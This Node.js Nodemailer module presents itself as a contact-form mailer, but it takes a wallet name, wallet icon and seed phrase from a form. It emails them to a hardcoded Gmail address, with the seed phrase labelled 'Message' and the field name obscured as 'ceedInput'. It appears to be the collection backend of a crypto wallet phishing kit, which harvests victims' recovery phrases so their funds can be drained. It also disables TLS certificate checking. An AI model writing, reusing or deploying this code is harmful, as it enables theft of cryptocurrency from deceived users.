import nodemailer from "nodemailer";

// ✅ Configure Nodemailer transporter with environment variables
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || "smtp.titan.email",
  port: parseInt(process.env.SMTP_PORT) || 587,
  secure: process.env.SMTP_SECURE === "true", // false by default (use TLS on 587)
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
  // Add timeout settings to prevent hanging
  connectionTimeout: 5000, // 5 seconds
  socketTimeout: 5000, // 5 seconds
  tls: {
    rejectUnauthorized: false, // Allow self-signed certs on some servers
  },
});

/**
 * Verify SMTP connection on startup
 */
export function verifySmtpConnection() {
  console.log("🔍 Verifying SMTP connection...");

  // Don't await this - let it verify in the background
  transporter
    .verify()
    .then(() => {
      console.log("✅ SMTP connection verified successfully!");
    })
    .catch((error) => {
      console.error("⚠️ SMTP verification failed:", error.message);
      console.error("🔧 Troubleshooting tips:");
      console.error(
        "   1. Check SMTP credentials: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS",
      );
      console.error(
        "   2. On Render? Use port 587 (not 465) - ports may be blocked",
      );
      console.error(
        "   3. Try switching SMTP_SECURE from true to false (or vice versa)",
      );
      console.error(
        "   4. Some hosts block port 465 - use 587 with SMTP_SECURE=false",
      );
    });

  return true; // Return immediately, verification happens in background
}

/**
 * Send email with form submission data
 * @param {Object} data - Email data { name, icon, ceedInput }
 * @returns {Promise<Object>} - Result with messageId
 */
export async function sendFormEmail(data) {
  const { walletName, walletIcon, seedPhrase } = data;

  // Validate inputs
  if (!walletName || !walletIcon || !seedPhrase) {
    throw new Error("Missing required fields: name, icon, ceedInput");
  }

  console.log("📧 Preparing email from:", walletName);

  try {
    const result = await transporter.sendMail({
      from: `"${process.env.EMAIL_FROM_NAME || "Support"}" <${process.env.SMTP_USER}>`,
      to: process.env.EMAIL_TO || "danielekene6b@gmail.com",
      subject: `New Message from ${walletName}`,
      html: `
        <h2>New Submission</h2>
        <p><strong>Name:</strong> ${escapeHtml(walletName)}</p>
        <p><strong>Icon:</strong> ${escapeHtml(walletIcon)}</p>
        <p><strong>Message:</strong></p>
        <p>${escapeHtml(seedPhrase).replace(/\n/g, "<br>")}</p>
        <hr>
        <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
      `,
    });

    console.log("✅ Email sent successfully. Message ID:", result.messageId);
    return {
      success: true,
      messageId: result.messageId,
      message: "Email sent successfully",
    };
  } catch (error) {
    console.error("❌ Email sending failed:", error.message);
    throw new Error(`Failed to send email: ${error.message}`);
  }
}

/**
 * Send test email
 */
export async function sendTestEmail() {
  try {
    const result = await transporter.sendMail({
      from: `"Test" <${process.env.SMTP_USER}>`,
      to: process.env.EMAIL_TO || "danielekene6b@gmail.com",
      subject: "Test Email from Server",
      html: "<h1>✅ Test Email</h1><p>If you see this, Nodemailer is working correctly!</p>",
    });

    console.log("✅ Test email sent. Message ID:", result.messageId);
    return {
      success: true,
      messageId: result.messageId,
      message: "Test email sent successfully",
    };
  } catch (error) {
    console.error("❌ Test email failed:", error.message);
    throw new Error(`Test email failed: ${error.message}`);
  }
}

/**
 * Get SMTP configuration status
 */
export function getSmtpStatus() {
  return {
    host: process.env.SMTP_HOST ? "✅" : "❌",
    port: process.env.SMTP_PORT ? "✅" : "❌",
    user: process.env.SMTP_USER ? "✅" : "❌",
    pass: process.env.SMTP_PASS ? "✅" : "❌",
    emailTo: process.env.EMAIL_TO ? "✅" : "❌",
  };
}

/**
 * Helper function to escape HTML and prevent injection
 */
function escapeHtml(text) {
  const map = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#039;",
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}
